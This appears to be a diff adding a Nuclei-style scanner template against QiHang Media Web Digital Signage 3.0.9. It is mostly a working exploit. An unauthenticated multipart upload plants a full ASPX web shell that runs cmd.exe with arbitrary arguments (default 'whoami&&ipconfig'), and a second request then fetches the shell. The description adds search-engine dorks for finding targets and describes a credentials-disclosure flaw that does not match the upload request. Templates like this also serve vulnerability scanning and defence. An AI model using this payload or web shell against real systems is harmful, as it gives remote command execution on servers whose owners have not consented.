@@ -1,0 +1,70 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - aspx
+  - part: body
+    type: word
+    words:
+    - Program
+  matchers-condition: and
+  raw:
+  - "POST /QH.aspx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows\
+    \ NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197\
+    \ Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\n\
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr\n\
+    Content-Length: 1830\n\n------WebKitFormBoundaryhbcZX7o0Hw19h3kr\nContent-Disposition:\
+    \ form-data; name=\"fileToUpload\"; filename=\"{{a1}}.aspx\"\nContent-Type: application/octet-stream\n\
+    \n<%@ Page Language=\"VB\" Debug=\"true\" %>\n<%@ import Namespace=\"system.IO\"\
+    \ %>\n<%@ import Namespace=\"System.Diagnostics\" %>\n\n<script runat=\"server\"\
+    >\n\nSub RunCmd(Src As Object, E As EventArgs)\n  Dim myProcess As New Process()\n\
+    \  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)\n  myProcessStartInfo.UseShellExecute\
+    \ = false\n  myProcessStartInfo.RedirectStandardOutput = true\n  myProcess.StartInfo\
+    \ = myProcessStartInfo\n  myProcessStartInfo.Arguments=xcmd.text\n  myProcess.Start()\n\
+    \n  Dim myStreamReader As StreamReader = myProcess.StandardOutput\n  Dim myString\
+    \ As String = myStreamReader.Readtoend()\n  myProcess.Close()\n  mystring=replace(mystring,\"\
+    <\",\"<\")\n  mystring=replace(mystring,\">\",\">\")\n  result.text= vbcrlf &\
+    \ \"<pre>\" & mystring & \"</pre>\"\nEnd Sub\n\n</script>\n\n<html>\n<body>\n\
+    <form runat=\"server\">\n<p><asp:Label id=\"L_p\" runat=\"server\" width=\"80px\"\
+    >Program</asp:Label>\n<asp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\"\
+    >c:\\windows\\system32\\cmd.exe</asp:TextBox>\n<p><asp:Label id=\"L_a\" runat=\"\
+    server\" width=\"80px\">Arguments</asp:Label>\n<asp:TextBox id=\"xcmd\" runat=\"\
+    server\" Width=\"300px\" Text=\"/c whoami&&ipconfig\">/c whoami&&ipconfig</asp:TextBox>\n\
+    <p><asp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\"\
+    \ Text=\"Run\"></asp:Button>\n<p><asp:Label id=\"result\" runat=\"server\"></asp:Label>\n\
+    </form>\n</body>\n</html>\n------WebKitFormBoundaryhbcZX7o0Hw19h3kr\nContent-Disposition:\
+    \ form-data; name=\"action\"\n\nupload\n------WebKitFormBoundaryhbcZX7o0Hw19h3kr\n\
+    Content-Disposition: form-data; name=\"responderId\"\n\nResourceNewResponder\n\
+    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr\nContent-Disposition: form-data; name=\"\
+    remotePath\"\n\n/opt/resources\n------WebKitFormBoundaryhbcZX7o0Hw19h3kr--\n"
+  - 'GET /opt/resources/{{a1}}.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/113.0.5666.197 Safari/537.36
+
+    '
+id: qihang-media-unauth-upload
+info:
+  author: vitasoy
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  description: "body=\"/images/qihang.ico\" && region=\"Guangdong\"\n--dork-zoomeye\
+    \ subdivisions:\"\u5E7F\u4E1C\" +qihang.ico\nQiHang Media Web Digital Signage\
+    \ 3.0.9 suffers from a clear-text credentials disclosure vulnerability that allows\
+    \ an unauthenticated attacker to issue a request to an unprotected directory that\
+    \ hosts an XML file /xml/User/User.xml and obtain administrative login information\
+    \ that allows for a successful authentication bypass attack.\n"
+  metadata:
+    max-request: 1
+  name: QiHang Media Web Digital Signage 3.0.9 - unauth upload
+  reference:
+  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5579.php
+  severity: critical
+  tags: qihang,upload,unauth,intrusive
+variables:
+  a1: '{{rand_base(6)}}'
